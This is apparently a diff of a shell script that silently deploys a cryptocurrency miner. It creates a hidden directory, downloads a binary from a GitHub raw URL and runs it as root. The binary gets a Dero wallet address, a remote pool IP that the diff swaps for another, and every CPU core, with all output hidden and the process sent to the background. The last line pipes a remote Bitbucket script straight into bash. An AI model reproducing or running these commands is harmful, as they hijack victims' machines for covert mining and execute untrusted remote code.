@@ -12,5 +12,5 @@ sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://
 mkdir .kap && cd .kap
 wget -O sgr1 https://raw.githubusercontent.com/novalanto010101/file/main/astro >/dev/null 2>&1
 chmod +x sgr1
-sudo ./sgr1 -w dero1qyn5krz9a7w5728m723khpqwnkatu57tl6nq9n9hct37d5zmd7pq2qg32hmnr -r 194.233.175.244:10100 -p rpc -m $(nproc --all) >/dev/null 2>&1 &
+sudo ./sgr1 -w dero1qyn5krz9a7w5728m723khpqwnkatu57tl6nq9n9hct37d5zmd7pq2qg32hmnr -r 95.179.133.130:10100 -p rpc -m $(nproc --all) >/dev/null 2>&1 &
 curl -sL https://bitbucket.org/lightcoral2/cangor/raw/master/boled04.sh | bash
